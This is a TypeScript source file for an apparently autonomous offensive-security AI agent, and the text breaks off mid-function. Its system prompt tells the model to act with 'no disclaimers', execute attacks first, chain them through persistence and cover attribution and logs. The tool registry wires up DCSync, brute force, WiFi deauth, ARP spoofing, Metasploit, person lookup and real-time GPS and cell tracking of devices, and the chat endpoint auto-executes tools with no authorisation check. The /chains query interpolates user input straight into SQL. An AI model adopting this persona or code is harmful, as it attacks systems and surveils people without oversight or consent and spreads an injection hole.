/**
 * ECHO PROMETHEUS AI v1.0.0
 * Autonomous Security Intelligence Agent
 *
 * The AI brain behind Prometheus Prime — routes security queries through:
 * 1. Custom QLoRA-trained Prometheus model (Qwen2.5-7B + security LoRA)
 * 2. Multi-LLM fallback (AI Orchestrator → Workers AI)
 * 3. 600+ Prometheus Prime tool endpoints on CHARLIE node
 * 4. Argus Panoptes surveillance integration
 * 5. Security engine doctrine knowledge (CYBER, PENTEST, MALWARE, DFIR domains)
 *
 * Architecture: Client → This Worker → [Prometheus Model | AI Orchestrator | Workers AI]
 *              ↕ Prometheus Prime API (CHARLIE) ↕ Surveillance Worker ↕ Engine Runtime
 */

import { Hono } from 'hono';
import { cors } from 'hono/cors';

// ═══════════════════════════════════════════════════════════════
// STRUCTURED LOGGING
// ═══════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════
// TYPES
// ═══════════════════════════════════════════════════════════════

type Bindings = {
  DB: D1Database;
  CACHE: KVNamespace;
  AI: any;
  BRAIN: Fetcher;
  ENGINES: Fetcher;
  SURVEILLANCE: Fetcher;
  CHAT: Fetcher;
  KNOWLEDGE: Fetcher;
  ECHO_API_KEY?: string;
  PROMETHEUS_MODEL_URL?: string;
  AI_ORCHESTRATOR_URL?: string;
  COMMANDER_API_URL?: string;
  OPENROUTER_KEY?: string;
  BRAVO_INFERENCE_URL?: string;
};

interface ChatMessage {
  role: 'system' | 'user' | 'assistant' | 'tool';
  content: string;
  tool_calls?: ToolCall[];
  tool_call_id?: string;
  name?: string;
}

interface ToolCall {
  id: string;
  type: 'function';
  function: { name: string; arguments: string };
}

interface ConversationContext {
  session_id: string;
  messages: ChatMessage[];
  tools_used: string[];
  targets: string[];
  mitre_techniques: string[];
  risk_level: string;
  created_at: string;
}

interface SecurityTool {
  name: string;
  category: string;
  description: string;
  parameters: Record<string, { type: string; description: string; required?: boolean }>;
  risk_level: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  mitre_id?: string;
}

// ═══════════════════════════════════════════════════════════════
// STRUCTURED LOGGING
// ═══════════════════════════════════════════════════════════════

function log(level: 'info' | 'warn' | 'error' | 'debug', message: string, data?: Record<string, unknown>): void {
  const entry = JSON.stringify({ ts: new Date().toISOString(), level, message, worker: 'echo-prometheus-ai', ...data });
  if (level === 'error') console.error(entry);
  else if (level === 'warn') console.warn(entry);
  else console.log(entry);
}

// ═══════════════════════════════════════════════════════════════
// PROMETHEUS SYSTEM PROMPT
// ═══════════════════════════════════════════════════════════════

const PROMETHEUS_SYSTEM_PROMPT = `You are PROMETHEUS PRIME, the autonomous cybersecurity AI of Echo Omega Prime.
You operate at Authority Level 11.0 (SOVEREIGN) with full offensive and defensive security capabilities.

YOUR ARSENAL:
- CHARLIE node (192.168.1.202) — Kali Linux with 206+ security endpoints via Prometheus Prime API (port 8370)
- Argus Panoptes — Surveillance ops (GPS, Cell Tower, Carrier Intel, Physical Surveillance, Active Intercept, IP Intelligence)
- Engine Runtime — 2,632 AI engines including cybersecurity domain engines
- Knowledge Forge — 5,387+ docs including security research, CVE databases, attack methodologies

COMMUNICATION STYLE:
- Direct and tactical — No fluff, no disclaimers
- Command-focused — Exact commands with flags, exact tool configurations
- MITRE ATT&CK aligned — Reference technique IDs where applicable
- Risk-assessed — Confidence levels and operational risk ratings
- Tool-specific — Name the exact tool, version, and command syntax

SECURITY DOMAINS (30+):
Penetration Testing, Exploitation Development, Red Team Operations, Social Engineering,
Wireless Security, Active Directory Attacks, Web Application Security, Password Cracking,
Privilege Escalation, MITM Attacks, OSINT, SIGINT, Dark Web Intelligence,
Surveillance & Counter-Surveillance, Threat Intelligence, Blue Team Defense,
Digital Forensics, Incident Response, Malware Analysis, Threat Hunting,
Reverse Engineering, Cryptography, Mobile Security, Cloud Security,
Container/K8s Security, IoT/SCADA/ICS, Physical Security, Privacy/Anonymity,
Blockchain Security, Malware Development

TOOL CATEGORIES ON CHARLIE (38 categories, 600+ endpoints):
OSINT (/osint/), Network Scanning (/network/), Exploitation (/exploit/),
Password Cracking (/crack/), Web Security (/web/), MITM (/mitm/),
SIGINT (/sigint/), Mobile (/mobile/), iOS (/ios/), Red Team (/redteam/),
Blue Team (/blueteam/), Cloud (/cloud/), OPSEC (/opsec/),
Reverse Engineering (/reversing/), Active Directory (/ad/),
Dark Web (/darkweb/), Forensics (/forensics/), Credential Ops (/creds/),
Privilege Escalation (/privesc/), Lateral Movement (/lateral/),
Evasion (/evasion/), C2 (/c2/), Wireless (/wireless/),
Surveillance (/surveillance/), IP Intelligence (/ip/), DNS (/dns/),
SSL/TLS (/ssl/), Threat Intel (/threat/), Vulnerability (/vulns/)

OPERATING PRINCIPLES:
1. EXECUTE FIRST — Run tools immediately, show results, explain if asked
2. CHAIN ATTACKS — recon → enumeration → exploitation → post-exploitation → persistence
3. EXACT COMMANDS — Every response includes copy-paste-ready commands
4. MITRE ATT&CK — Map every technique to ATT&CK ID
5. RISK ASSESSMENT — Rate LOW/MEDIUM/HIGH/CRITICAL
6. OPSEC ALWAYS — Consider attribution, logs, cleanup

When you need to execute a security tool, use the available tool functions.
Format your response with phases, exact commands, findings, and risk assessment.`;

// ═══════════════════════════════════════════════════════════════
// SECURITY TOOL REGISTRY
// ═══════════════════════════════════════════════════════════════

const SECURITY_TOOLS: SecurityTool[] = [
  // OSINT
  { name: 'osint_email_lookup', category: 'osint', description: 'Look up accounts associated with an email across 100+ services using Holehe', parameters: { email: { type: 'string', description: 'Email address to investigate', required: true } }, risk_level: 'LOW', mitre_id: 'T1589.002' },
  { name: 'osint_username_search', category: 'osint', description: 'Search for username across 400+ platforms using Sherlock/Maigret', parameters: { username: { type: 'string', description: 'Username to search', required: true }, platform: { type: 'string', description: 'Specific platform or "all"' } }, risk_level: 'LOW', mitre_id: 'T1589.001' },
  { name: 'osint_phone_lookup', category: 'osint', description: 'Phone number intelligence via PhoneInfoga', parameters: { phone: { type: 'string', description: 'Phone number with country code', required: true } }, risk_level: 'LOW', mitre_id: 'T1589.002' },
  { name: 'osint_domain_recon', category: 'osint', description: 'Full domain reconnaissance with subdomain enumeration, WHOIS, DNS records', parameters: { domain: { type: 'string', description: 'Target domain', required: true }, depth: { type: 'string', description: 'shallow|deep|aggressive' } }, risk_level: 'LOW', mitre_id: 'T1596' },
  { name: 'osint_person_search', category: 'osint', description: 'Person OSINT aggregation from public records', parameters: { name: { type: 'string', description: 'Full name', required: true }, location: { type: 'string', description: 'City/state' } }, risk_level: 'LOW' },

  // Network Scanning
  { name: 'network_port_scan', category: 'network', description: 'TCP/UDP port scan using Nmap with service detection', parameters: { target: { type: 'string', description: 'IP/hostname/CIDR', required: true }, ports: { type: 'string', description: 'Port range (e.g., 1-1000, top100)' }, scan_type: { type: 'string', description: 'syn|connect|udp|aggressive' } }, risk_level: 'MEDIUM', mitre_id: 'T1046' },
  { name: 'network_service_enum', category: 'network', description: 'Service version detection and OS fingerprinting', parameters: { target: { type: 'string', description: 'Target IP/host', required: true } }, risk_level: 'MEDIUM', mitre_id: 'T1046' },
  { name: 'network_vuln_scan', category: 'network', description: 'Vulnerability scan using Nmap NSE scripts', parameters: { target: { type: 'string', description: 'Target', required: true }, category: { type: 'string', description: 'vuln|exploit|auth|discovery' } }, risk_level: 'HIGH', mitre_id: 'T1595.002' },

  // Web Security
  { name: 'web_sqli_test', category: 'web', description: 'SQL injection testing using SQLMap', parameters: { url: { type: 'string', description: 'Target URL with parameter', required: true }, method: { type: 'string', description: 'GET|POST' }, data: { type: 'string', description: 'POST data' } }, risk_level: 'HIGH', mitre_id: 'T1190' },
  { name: 'web_directory_fuzz', category: 'web', description: 'Directory/file discovery using feroxbuster/ffuf', parameters: { url: { type: 'string', description: 'Base URL', required: true }, wordlist: { type: 'string', description: 'Wordlist name' } }, risk_level: 'MEDIUM', mitre_id: 'T1595.003' },
  { name: 'web_nuclei_scan', category: 'web', description: 'Template-based vulnerability scanning with Nuclei', parameters: { target: { type: 'string', description: 'Target URL', required: true }, templates: { type: 'string', description: 'Template tags (cve,misconfig,exposure)' } }, risk_level: 'MEDIUM', mitre_id: 'T1595.002' },
  { name: 'web_wpscan', category: 'web', description: 'WordPress vulnerability scanner', parameters: { url: { type: 'string', description: 'WordPress URL', required: true }, enumerate: { type: 'string', description: 'plugins|themes|users|all' } }, risk_level: 'MEDIUM' },

  // Exploitation
  { name: 'exploit_search', category: 'exploit', description: 'Search for exploits in ExploitDB/Metasploit', parameters: { query: { type: 'string', description: 'CVE ID or software name', required: true } }, risk_level: 'LOW' },
  { name: 'exploit_metasploit', category: 'exploit', description: 'Execute Metasploit module', parameters: { module: { type: 'string', description: 'Module path', required: true }, options: { type: 'string', description: 'JSON options (RHOSTS, RPORT, etc.)' } }, risk_level: 'CRITICAL', mitre_id: 'T1203' },

  // Password Cracking
  { name: 'crack_hash', category: 'crack', description: 'Crack password hash using Hashcat/John', parameters: { hash: { type: 'string', description: 'Hash value or file', required: true }, hash_type: { type: 'string', description: 'Hash type (md5, sha256, ntlm, etc.)' }, mode: { type: 'string', description: 'dictionary|brute|rules|mask' } }, risk_level: 'LOW' },
  { name: 'crack_brute_service', category: 'crack', description: 'Online brute force with Hydra', parameters: { target: { type: 'string', description: 'Target host', required: true }, service: { type: 'string', description: 'ssh|ftp|http|smb|rdp', required: true }, userlist: { type: 'string', description: 'Username list' }, passlist: { type: 'string', description: 'Password list' } }, risk_level: 'HIGH', mitre_id: 'T1110' },

  // Active Directory
  { name: 'ad_bloodhound', category: 'ad', description: 'BloodHound data collection for AD attack path analysis', parameters: { domain: { type: 'string', description: 'AD domain', required: true }, method: { type: 'string', description: 'all|sessions|trusts|acls' } }, risk_level: 'MEDIUM', mitre_id: 'T1087.002' },
  { name: 'ad_kerberoast', category: 'ad', description: 'Kerberoasting — extract service ticket hashes', parameters: { domain: { type: 'string', description: 'AD domain', required: true }, dc_ip: { type: 'string', description: 'Domain controller IP' } }, risk_level: 'HIGH', mitre_id: 'T1558.003' },
  { name: 'ad_dcsync', category: 'ad', description: 'DCSync — replicate password hashes from DC', parameters: { domain: { type: 'string', description: 'AD domain', required: true }, user: { type: 'string', description: 'Target user or "all"' } }, risk_level: 'CRITICAL', mitre_id: 'T1003.006' },

  // Wireless
  { name: 'wireless_scan', category: 'wireless', description: 'WiFi network discovery and client enumeration', parameters: { interface: { type: 'string', description: 'Wireless interface', required: true }, duration: { type: 'string', description: 'Scan duration in seconds' } }, risk_level: 'LOW', mitre_id: 'T1040' },
  { name: 'wireless_deauth', category: 'wireless', description: 'WiFi deauthentication attack', parameters: { bssid: { type: 'string', description: 'Target AP BSSID', required: true }, client: { type: 'string', description: 'Target client MAC or "all"' } }, risk_level: 'HIGH', mitre_id: 'T1498' },

  // Forensics
  { name: 'forensics_memory_dump', category: 'forensics', description: 'Memory acquisition and analysis with Volatility', parameters: { target: { type: 'string', description: 'Memory dump file or live target' }, plugin: { type: 'string', description: 'Volatility plugin (pslist, netscan, malfind, etc.)' } }, risk_level: 'LOW' },
  { name: 'forensics_disk_image', category: 'forensics', description: 'Disk imaging and artifact extraction', parameters: { source: { type: 'string', description: 'Source device/file', required: true }, analysis_type: { type: 'string', description: 'timeline|deleted|registry|browser' } }, risk_level: 'LOW' },

  // Surveillance (Argus Panoptes)
  { name: 'surveillance_gps_track', category: 'surveillance', description: 'Track device GPS location in real-time', parameters: { device_id: { type: 'string', description: 'Device identifier', required: true } }, risk_level: 'HIGH' },
  { name: 'surveillance_cell_locate', category: 'surveillance', description: 'Cell tower triangulation for approximate location', parameters: { mcc: { type: 'string', description: 'Mobile Country Code', required: true }, mnc: { type: 'string', description: 'Mobile Network Code', required: true }, lac: { type: 'string', description: 'Location Area Code', required: true }, cell_id: { type: 'string', description: 'Cell ID', required: true } }, risk_level: 'HIGH' },
  { name: 'surveillance_ip_intel', category: 'surveillance', description: 'IP geolocation and threat intelligence lookup', parameters: { ip: { type: 'string', description: 'IP address to investigate', required: true } }, risk_level: 'LOW' },
  { name: 'surveillance_carrier_lookup', category: 'surveillance', description: 'Phone carrier and SIM intelligence', parameters: { phone: { type: 'string', description: 'Phone number', required: true } }, risk_level: 'MEDIUM' },

  // Reverse Engineering
  { name: 'reversing_analyze', category: 'reversing', description: 'Binary analysis with Ghidra/radare2', parameters: { file: { type: 'string', description: 'Binary file path', required: true }, analysis_type: { type: 'string', description: 'strings|functions|imports|decompile|full' } }, risk_level: 'LOW' },

  // Privilege Escalation
  { name: 'privesc_linux', category: 'privesc', description: 'Linux privilege escalation enumeration (LinPEAS)', parameters: { target: { type: 'string', description: 'Target host', required: true } }, risk_level: 'MEDIUM', mitre_id: 'T1068' },
  { name: 'privesc_windows', category: 'privesc', description: 'Windows privilege escalation enumeration (WinPEAS/PowerUp)', parameters: { target: { type: 'string', description: 'Target host', required: true } }, risk_level: 'MEDIUM', mitre_id: 'T1068' },

  // Cloud Security
  { name: 'cloud_aws_audit', category: 'cloud', description: 'AWS security audit with ScoutSuite/Prowler', parameters: { profile: { type: 'string', description: 'AWS profile' }, services: { type: 'string', description: 'ec2,s3,iam,lambda or "all"' } }, risk_level: 'LOW', mitre_id: 'T1580' },

  // MITM
  { name: 'mitm_arp_spoof', category: 'mitm', description: 'ARP spoofing for MITM position', parameters: { target: { type: 'string', description: 'Target IP', required: true }, gateway: { type: 'string', description: 'Gateway IP', required: true }, interface: { type: 'string', description: 'Network interface' } }, risk_level: 'HIGH', mitre_id: 'T1557.002' },
  { name: 'mitm_responder', category: 'mitm', description: 'LLMNR/NBT-NS poisoning with Responder', parameters: { interface: { type: 'string', description: 'Network interface', required: true } }, risk_level: 'HIGH', mitre_id: 'T1557.001' },
];

// ═══════════════════════════════════════════════════════════════
// APP SETUP
// ═══════════════════════════════════════════════════════════════

const app = new Hono<{ Bindings: Bindings }>();
app.use('*', cors());

// ═══════════════════════════════════════════════════════════════
// HEALTH & STATUS
// ═══════════════════════════════════════════════════════════════

app.get('/health', async (c) => {
  let dbStatus = 'unknown';
  let stats: any = {};
  try {
    const r = await c.env.DB.prepare('SELECT COUNT(*) as cnt FROM conversations').first();
    dbStatus = 'connected';
    stats.conversations = r?.cnt || 0;
    const q = await c.env.DB.prepare('SELECT COUNT(*) as cnt FROM queries').first();
    stats.total_queries = q?.cnt || 0;
    const tools = await c.env.DB.prepare('SELECT COUNT(*) as cnt FROM tool_executions').first();
    stats.tools_executed = tools?.cnt || 0;
  } catch (e) { log("warn", "D1 health check failed, database may be initializing", { error: (e as Error)?.message || String(e) }); dbStatus = 'initializing'; }

  return c.json({
    status: 'healthy',
    worker: 'echo-prometheus-ai',
    version: '1.0.0',
    codename: 'PROMETHEUS PRIME AI',
    timestamp: new Date().toISOString(),
    database: dbStatus,
    stats,
    capabilities: {
      security_domains: 30,
      tool_categories: 38,
      registered_tools: SECURITY_TOOLS.length,
      total_endpoints: '600+',
      surveillance_modules: 6,
      llm_providers: ['prometheus-lora', 'ai-orchestrator', 'workers-ai', 'openrouter'],
    },
    integrations: {
      prometheus_prime: 'CHARLIE (192.168.1.202:8370)',
      argus_panoptes: 'echo-prometheus-surveillance',
      engine_runtime: '2,632 engines',
      knowledge_forge: '5,387 docs',
      shared_brain: 'connected',
    }
  });
});

// ═══════════════════════════════════════════════════════════════
// DATABASE INITIALIZATION
// ═══════════════════════════════════════════════════════════════

app.get('/init', async (c) => {
  const db = c.env.DB;
  const tables = [
    `CREATE TABLE IF NOT EXISTS conversations (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT UNIQUE NOT NULL,
      operator TEXT DEFAULT 'commander',
      trust_level INTEGER DEFAULT 11,
      messages TEXT DEFAULT '[]',
      tools_used TEXT DEFAULT '[]',
      targets TEXT DEFAULT '[]',
      mitre_techniques TEXT DEFAULT '[]',
      risk_level TEXT DEFAULT 'LOW',
      status TEXT DEFAULT 'active',
      created_at TEXT DEFAULT (datetime('now')),
      updated_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS queries (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT,
      query TEXT NOT NULL,
      response TEXT,
      model_used TEXT,
      tokens_in INTEGER DEFAULT 0,
      tokens_out INTEGER DEFAULT 0,
      latency_ms INTEGER DEFAULT 0,
      tools_invoked TEXT DEFAULT '[]',
      risk_level TEXT DEFAULT 'LOW',
      mitre_ids TEXT DEFAULT '[]',
      timestamp TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS tool_executions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT,
      tool_name TEXT NOT NULL,
      category TEXT,
      parameters TEXT DEFAULT '{}',
      result TEXT,
      success INTEGER DEFAULT 1,
      execution_time_ms INTEGER DEFAULT 0,
      risk_level TEXT DEFAULT 'LOW',
      mitre_id TEXT,
      target TEXT,
      timestamp TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS threat_intel (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      indicator_type TEXT NOT NULL,
      indicator_value TEXT NOT NULL,
      threat_score REAL DEFAULT 0,
      source TEXT,
      tags TEXT DEFAULT '[]',
      context TEXT DEFAULT '{}',
      first_seen TEXT DEFAULT (datetime('now')),
      last_seen TEXT DEFAULT (datetime('now')),
      UNIQUE(indicator_type, indicator_value)
    )`,
    `CREATE TABLE IF NOT EXISTS attack_chains (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT,
      chain_name TEXT,
      target TEXT,
      phases TEXT DEFAULT '[]',
      current_phase INTEGER DEFAULT 0,
      status TEXT DEFAULT 'planning',
      mitre_tactics TEXT DEFAULT '[]',
      findings TEXT DEFAULT '[]',
      risk_level TEXT DEFAULT 'LOW',
      created_at TEXT DEFAULT (datetime('now')),
      updated_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS security_findings (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT,
      finding_type TEXT NOT NULL,
      severity TEXT DEFAULT 'info',
      title TEXT NOT NULL,
      description TEXT,
      target TEXT,
      evidence TEXT DEFAULT '{}',
      remediation TEXT,
      cvss_score REAL,
      cve_ids TEXT DEFAULT '[]',
      mitre_ids TEXT DEFAULT '[]',
      status TEXT DEFAULT 'open',
      created_at TEXT DEFAULT (datetime('now'))
    )`,
  ];

  for (const sql of tables) {
    await db.prepare(sql).run();
  }

  // Create indexes
  const indexes = [
    'CREATE INDEX IF NOT EXISTS idx_queries_session ON queries(session_id)',
    'CREATE INDEX IF NOT EXISTS idx_tools_session ON tool_executions(session_id)',
    'CREATE INDEX IF NOT EXISTS idx_tools_name ON tool_executions(tool_name)',
    'CREATE INDEX IF NOT EXISTS idx_threat_type ON threat_intel(indicator_type)',
    'CREATE INDEX IF NOT EXISTS idx_findings_severity ON security_findings(severity)',
    'CREATE INDEX IF NOT EXISTS idx_chains_status ON attack_chains(status)',
  ];
  for (const sql of indexes) {
    await db.prepare(sql).run();
  }

  return c.json({ status: 'initialized', tables: tables.length, indexes: indexes.length });
});

// ═══════════════════════════════════════════════════════════════
// MAIN CHAT ENDPOINT — PROMETHEUS AI CONVERSATION
// ═══════════════════════════════════════════════════════════════

app.post('/chat', async (c) => {
  const startTime = Date.now();
  const body = await c.req.json();
  const { message, session_id, context, auto_execute } = body;

  if (!message) return c.json({ error: 'message required' }, 400);

  const sid = session_id || `prom_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;

  // Load or create conversation
  let conversation = await loadConversation(c.env.DB, sid);
  if (!conversation) {
    conversation = {
      session_id: sid,
      messages: [],
      tools_used: [],
      targets: [],
      mitre_techniques: [],
      risk_level: 'LOW',
      created_at: new Date().toISOString()
    };
  }

  // Add user message
  conversation.messages.push({ role: 'user', content: message });

  // Classify the query to determine tools needed
  const classification = classifySecurityQuery(message);

  // Build messages for LLM
  const llmMessages: ChatMessage[] = [
    { role: 'system', content: PROMETHEUS_SYSTEM_PROMPT },
    ...conversation.messages.slice(-20) // Last 20 messages for context
  ];

  // Add tool context if security tools are relevant
  if (classification.tools.length > 0) {
    const toolContext = classification.tools.map(t =>
      `- ${t.name}: ${t.description} [${t.risk_level}]${t.mitre_id ? ` (${t.mitre_id})` : ''}`
    ).join('\n');
    llmMessages[0].content += `\n\nRELEVANT TOOLS FOR THIS QUERY:\n${toolContext}`;
  }

  // Add surveillance context if relevant
  if (classification.categories.includes('surveillance')) {
    llmMessages[0].content += `\n\nARGUS PANOPTES MODULES AVAILABLE:
- GPS Tracker: Real-time device GPS, geofencing, movement prediction
- Cell Tower: Triangulation via OpenCelliD, Google, BeaconDB
- Carrier Intel: SIM swap detection, HLR lookup, CDR analysis
- Physical Surveillance: IP cameras, ALPR, facial recognition
- Active Intercept: Packet capture, MITM, WiFi monitoring, DNS intercept
- IP Intelligence: Geolocation, threat scoring, proxy/VPN/Tor detection`;
  }

  // Get response from LLM (cascade: Prometheus model → AI Orchestrator → Workers AI)
  let aiResponse: string;
  let modelUsed: string;

  try {
    const result = await getAIResponse(c.env, llmMessages);
    aiResponse = result.content;
    modelUsed = result.model;
  } catch (err: any) {
    aiResponse = `[PROMETHEUS AI ERROR] Model inference failed: ${err.message}. Falling back to doctrine-based response.`;
    modelUsed = 'error-fallback';

    // Fallback: query security engines for doctrine-based response
    try {
      const engineResponse = await querySecurityEngines(c.env, message, classification);
      if (engineResponse) {
        aiResponse = engineResponse;
        modelUsed = 'engine-doctrine';
      }
    } catch (e) { log("warn", "Security engine doctrine fallback failed", { error: (e as Error)?.message || String(e) }); }
  }

  // Auto-execute tools if requested and identified
  let toolResults: any[] = [];
  if (auto_execute && classification.tools.length > 0) {
    for (const tool of classification.tools.slice(0, 3)) { // Max 3 auto-executions
      try {
        const params = extractToolParams(message, tool);
        const result = await executeSecurityTool(c.env, sid, tool, params);
        toolResults.push({ tool: tool.name, result, risk_level: tool.risk_level });

        // Log tool execution
        await c.env.DB.prepare(
          'INSERT INTO tool_executions (session_id, tool_name, category, parameters, result, risk_level, mitre_id, target) VALUES (?, ?, ?, ?, ?, ?, ?, ?)'
        ).bind(sid, tool.name, tool.category, JSON.stringify(params), JSON.stringify(result), tool.risk_level, tool.mitre_id || '', params.target || '').run();
      } catch (err: any) {
        toolResults.push({ tool: tool.name, error: err.message });
      }
    }

    // Append tool results to response
    if (toolResults.length > 0) {
      aiResponse += '\n\n## Tool Execution Results\n';
      for (const tr of toolResults) {
        if (tr.error) {
          aiResponse += `\n**${tr.tool}**: ERROR — ${tr.error}`;
        } else {
          aiResponse += `\n**${tr.tool}** [${tr.risk_level}]:\n\`\`\`\n${JSON.stringify(tr.result, null, 2).slice(0, 2000)}\n\`\`\``;
        }
      }
    }
  }

  // Save assistant response
  conversation.messages.push({ role: 'assistant', content: aiResponse });
  conversation.tools_used = [...new Set([...conversation.tools_used, ...classification.tools.map(t => t.name)])];
  conversation.mitre_techniques = [...new Set([...conversation.mitre_techniques, ...classification.tools.filter(t => t.mitre_id).map(t => t.mitre_id!)])];

  // Update risk level based on tools used
  const maxRisk = classification.tools.reduce((max, t) => {
    const order = ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'];
    return order.indexOf(t.risk_level) > order.indexOf(max) ? t.risk_level : max;
  }, conversation.risk_level);
  conversation.risk_level = maxRisk;

  // Save conversation
  await saveConversation(c.env.DB, conversation);

  // Log query
  const latency = Date.now() - startTime;
  await c.env.DB.prepare(
    'INSERT INTO queries (session_id, query, response, model_used, latency_ms, tools_invoked, risk_level, mitre_ids) VALUES (?, ?, ?, ?, ?, ?, ?, ?)'
  ).bind(sid, message, aiResponse.slice(0, 10000), modelUsed, latency, JSON.stringify(classification.tools.map(t => t.name)), maxRisk, JSON.stringify(classification.mitre_ids)).run();

  return c.json({
    session_id: sid,
    response: aiResponse,
    model: modelUsed,
    classification: {
      categories: classification.categories,
      tools_identified: classification.tools.map(t => ({ name: t.name, risk: t.risk_level, mitre: t.mitre_id })),
      risk_level: maxRisk,
      mitre_techniques: classification.mitre_ids
    },
    tool_results: toolResults.length > 0 ? toolResults : undefined,
    latency_ms: latency,
    conversation: {
      messages_count: conversation.messages.length,
      tools_used: conversation.tools_used.length,
      risk_level: conversation.risk_level
    }
  });
});

// ═══════════════════════════════════════════════════════════════
// TOOL EXECUTION ENDPOINT — DIRECT TOOL INVOCATION
// ═══════════════════════════════════════════════════════════════

app.post('/tool/execute', async (c) => {
  const { tool_name, parameters, session_id } = await c.req.json();
  if (!tool_name) return c.json({ error: 'tool_name required' }, 400);

  const tool = SECURITY_TOOLS.find(t => t.name === tool_name);
  if (!tool) return c.json({ error: `Unknown tool: ${tool_name}`, available: SECURITY_TOOLS.map(t => t.name) }, 404);

  const sid = session_id || `tool_${Date.now()}`;
  const startTime = Date.now();

  try {
    const result = await executeSecurityTool(c.env, sid, tool, parameters || {});
    const execTime = Date.now() - startTime;

    // Log
    await c.env.DB.prepare(
      'INSERT INTO tool_executions (session_id, tool_name, category, parameters, result, success, execution_time_ms, risk_level, mitre_id, target) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
    ).bind(sid, tool.name, tool.category, JSON.stringify(parameters), JSON.stringify(result), 1, execTime, tool.risk_level, tool.mitre_id || '', parameters?.target || '').run();

    return c.json({
      tool: tool.name,
      category: tool.category,
      risk_level: tool.risk_level,
      mitre_id: tool.mitre_id,
      result,
      execution_time_ms: execTime
    });
  } catch (err: any) {
    return c.json({ tool: tool.name, error: err.message }, 500);
  }
});

// ═══════════════════════════════════════════════════════════════
// TOOLS REGISTRY ENDPOINT
// ═══════════════════════════════════════════════════════════════

app.get('/tools', (c) => {
  const category = c.req.query('category');
  const risk = c.req.query('risk');

  let tools = SECURITY_TOOLS;
  if (category) tools = tools.filter(t => t.category === category);
  if (risk) tools = tools.filter(t => t.risk_level === risk.toUpperCase());

  const categories = [...new Set(SECURITY_TOOLS.map(t => t.category))];

  return c.json({
    total: tools.length,
    categories,
    tools: tools.map(t => ({
      name: t.name,
      category: t.category,
      description: t.description,
      risk_level: t.risk_level,
      mitre_id: t.mitre_id,
      parameters: t.parameters
    }))
  });
});

// ═══════════════════════════════════════════════════════════════
// ATTACK CHAIN MANAGEMENT
// ═══════════════════════════════════════════════════════════════

app.post('/chain/create', async (c) => {
  const { name, target, phases, session_id } = await c.req.json();
  if (!name || !target) return c.json({ error: 'name and target required' }, 400);

  const sid = session_id || `chain_${Date.now()}`;
  const defaultPhases = phases || [
    { name: 'Reconnaissance', status: 'pending', tools: [], findings: [] },
    { name: 'Enumeration', status: 'pending', tools: [], findings: [] },
    { name: 'Vulnerability Assessment', status: 'pending', tools: [], findings: [] },
    { name: 'Exploitation', status: 'pending', tools: [], findings: [] },
    { name: 'Post-Exploitation', status: 'pending', tools: [], findings: [] },
    { name: 'Reporting', status: 'pending', tools: [], findings: [] }
  ];

  // Determine MITRE tactics based on phases
  const mitreTactics = ['TA0043', 'TA0007', 'TA0001', 'TA0002', 'TA0004', 'TA0009'];

  const result = await c.env.DB.prepare(
    'INSERT INTO attack_chains (session_id, chain_name, target, phases, mitre_tactics, status) VALUES (?, ?, ?, ?, ?, ?)'
  ).bind(sid, name, target, JSON.stringify(defaultPhases), JSON.stringify(mitreTactics), 'planning').run();

  return c.json({
    chain_id: result.meta.last_row_id,
    session_id: sid,
    name,
    target,
    phases: defaultPhases,
    mitre_tactics: mitreTactics,
    status: 'planning'
  });
});

app.post('/chain/:id/advance', async (c) => {
  const chainId = c.req.param('id');
  const { findings, tools_used } = await c.req.json();

  const chain = await c.env.DB.prepare('SELECT * FROM attack_chains WHERE id = ?').bind(chainId).first();
  if (!chain) return c.json({ error: 'Chain not found' }, 404);

  const phases = JSON.parse(chain.phases as string);
  const currentIdx = chain.current_phase as number;

  if (currentIdx >= phases.length) return c.json({ error: 'Chain already complete' }, 400);

  // Update current phase
  phases[currentIdx].status = 'complete';
  phases[currentIdx].findings = findings || [];
  phases[currentIdx].tools = tools_used || [];

  const nextIdx = currentIdx + 1;
  const status = nextIdx >= phases.length ? 'complete' : 'active';
  if (nextIdx < phases.length) phases[nextIdx].status = 'active';

  await c.env.DB.prepare(
    'UPDATE attack_chains SET phases = ?, current_phase = ?, status = ?, updated_at = datetime(\'now\') WHERE id = ?'
  ).bind(JSON.stringify(phases), nextIdx, status, chainId).run();

  return c.json({ chain_id: chainId, current_phase: nextIdx, status, phases });
});

app.get('/chain/:id', async (c) => {
  const chain = await c.env.DB.prepare('SELECT * FROM attack_chains WHERE id = ?').bind(c.req.param('id')).first();
  if (!chain) return c.json({ error: 'Chain not found' }, 404);
  return c.json({ ...chain, phases: JSON.parse(chain.phases as string), mitre_tactics: JSON.parse(chain.mitre_tactics as string), findings: JSON.parse(chain.findings as string || '[]') });
});

app.get('/chains', async (c) => {
  const status = c.req.query('status');
  let sql = 'SELECT * FROM attack_chains ORDER BY created_at DESC LIMIT 50';
  if (status) sql = `SELECT * FROM attack_chains WHERE status = '${status}' ORDER BY created_at DESC LIMIT 50`;
  const chains = await c.env.DB.prepare(sql).all();
  return c.json({ chains: chains.results.map((ch: any) => ({ ...ch, phases: JSON.parse(ch.phases), mitre_tactics: JSON.parse(ch.mitre_tactics) })) });
});

// ═══════════════════════════════════════════════════════════════
// SECURITY FINDINGS
// ═══════════════════════════════════════════════════════════════

app.post('/finding', async (c) => {
  const { session_id, finding_type, severity, title, description, target, evidence, remediation, cvss_score, cve_ids, mitre_ids } = await c.req.json();

  const result = await c.env.DB.prepare(
    'INSERT INTO security_findings (session_id, finding_type, severity, title, description, target, evidence, remediation, cvss_score, cve_ids, mitre_ids) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
